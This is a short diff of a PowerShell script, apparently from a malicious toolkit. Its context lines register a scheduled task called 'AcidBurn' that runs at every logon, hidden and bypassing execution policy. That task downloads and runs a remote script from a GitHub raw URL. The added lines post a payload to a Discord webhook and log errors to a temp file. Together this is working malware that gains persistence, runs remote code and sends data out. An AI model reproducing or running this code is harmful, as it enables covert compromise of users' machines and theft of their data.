@@ -21,3 +21,8 @@ $taskName = "AcidBurn"
 $cmd = "powershell -w hidden -ep bypass -c `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/stargosg/ducky/main/x.ps1')`""
 
 schtasks /create /tn $taskName /tr $cmd /sc onlogon /f 2>$null
+try {
+    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/..." -Method Post -Body $payload -ContentType "application/json"
+} catch {
+    $_ | Out-File "$env:TEMP\ab_error.txt"
+}
